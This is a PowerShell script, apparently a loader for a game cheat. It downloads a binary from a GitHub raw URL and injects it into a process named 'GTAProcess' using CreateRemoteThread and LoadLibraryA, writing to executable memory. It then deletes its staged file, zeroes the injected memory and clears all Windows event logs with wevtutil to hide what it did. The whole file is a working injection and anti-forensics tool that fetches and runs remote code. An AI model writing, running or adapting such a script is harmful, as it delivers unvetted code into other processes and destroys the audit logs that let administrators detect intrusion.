# language: PowerShell, file: inject.ps1, target: Windows 10/11, run as Admin

$DLL_URL   = "https://raw.githubusercontent.com/PannaratWiriyaarritham/littlesmallthingy/refs/heads/main/deardear_patch"
$PROC_NAME = "GTAProcess"

try {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class K {
    [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr OpenProcess(uint a, bool i, int pid);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr VirtualAllocEx(IntPtr p, IntPtr a, uint s, uint t, uint pr);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern bool VirtualFreeEx(IntPtr p, IntPtr a, uint s, uint f);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern bool WriteProcessMemory(IntPtr p, IntPtr a, byte[] b, uint s, out int w);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr CreateRemoteThread(IntPtr p, IntPtr a, uint s, IntPtr st, IntPtr pm, uint f, out IntPtr tid);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern uint WaitForSingleObject(IntPtr h, uint ms);
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Ansi)] public static extern IntPtr GetModuleHandleA(string m);
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr h, string n);
}
"@
    Write-Host "[+] Native API loaded"
} catch { Write-Host "[=] Native API already loaded" }

# download
try {
    $dllBytes = (New-Object Net.WebClient).DownloadData($DLL_URL)
    Write-Host "[+] Downloaded $($dllBytes.Length) bytes"
} catch {
    Write-Host "[-] Download failed: $($_.Exception.Message)"; exit 1
}

# find process
$proc = $null
for ($i = 0; $i -lt 60; $i++) {
    $proc = Get-Process -Name $PROC_NAME -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($proc) { break }
    Start-Sleep -Seconds 2
}
if (-not $proc) { Write-Host "[-] $PROC_NAME not found"; exit 1 }
Write-Host "[+] Target: $($proc.ProcessName) PID=$($proc.Id)"

# open
$hProc = [K]::OpenProcess(0x1FFFFF, $false, $proc.Id)
if ($hProc -eq [IntPtr]::Zero) { Write-Host "[-] OpenProcess failed (run as Admin)"; exit 1 }
Write-Host "[+] Handle: 0x$($hProc.ToString('X'))"

# write payload
$size = [uint32]$dllBytes.Length
$rMem = [K]::VirtualAllocEx($hProc, [IntPtr]::Zero, $size, 0x3000, 0x40)
$w = 0
[K]::WriteProcessMemory($hProc, $rMem, $dllBytes, $size, [ref]$w) | Out-Null
Write-Host "[+] Payload @ 0x$($rMem.ToString('X'))"

# stage on disk
$tmp = [IO.Path]::GetTempPath() + [Guid]::NewGuid().ToString("N").Substring(0,8) + ".tmp"
[IO.File]::WriteAllBytes($tmp, $dllBytes)

# write path
$pathBytes = [Text.Encoding]::ASCII.GetBytes($tmp + "`0")
$rStr = [K]::VirtualAllocEx($hProc, [IntPtr]::Zero, [uint32]$pathBytes.Length, 0x3000, 4)
$w2 = 0
[K]::WriteProcessMemory($hProc, $rStr, $pathBytes, [uint32]$pathBytes.Length, [ref]$w2) | Out-Null
Write-Host "[+] Path @ 0x$($rStr.ToString('X'))"

# resolve LoadLibraryA
$k32 = [K]::GetModuleHandleA("kernel32.dll")
$loadLib = [K]::GetProcAddress($k32, "LoadLibraryA")

# inject
$tid = [IntPtr]::Zero
$hThread = [K]::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $loadLib, $rStr, 0, [ref]$tid)
if ($hThread -eq [IntPtr]::Zero) {
    Write-Host "[-] CreateRemoteThread failed"
    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    [K]::CloseHandle($hProc); exit 1
}
Write-Host "[+] Thread TID=0x$($tid.ToString('X'))"

[K]::WaitForSingleObject($hThread, 5000) | Out-Null
Start-Sleep -Milliseconds 500

# cleanup
try { Remove-Item $tmp -Force -ErrorAction Stop; Write-Host "[+] Temp deleted" } catch {}
try {
    $z = New-Object byte[] $pathBytes.Length
    [K]::WriteProcessMemory($hProc, $rStr, $z, [uint32]$z.Length, [ref]$w2) | Out-Null
    [K]::VirtualFreeEx($hProc, $rStr, 0, 0x8000) | Out-Null
} catch {}
try { [K]::VirtualFreeEx($hProc, $rMem, 0, 0x8000) | Out-Null } catch {}

[K]::CloseHandle($hThread) | Out-Null
[K]::CloseHandle($hProc) | Out-Null

$dllBytes = $null; $pathBytes = $null
[GC]::Collect()

try {
    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
    wevtutil el | ForEach-Object { wevtutil cl $_ 2>$null }
} catch {}

Write-Host ""
Write-Host "success"
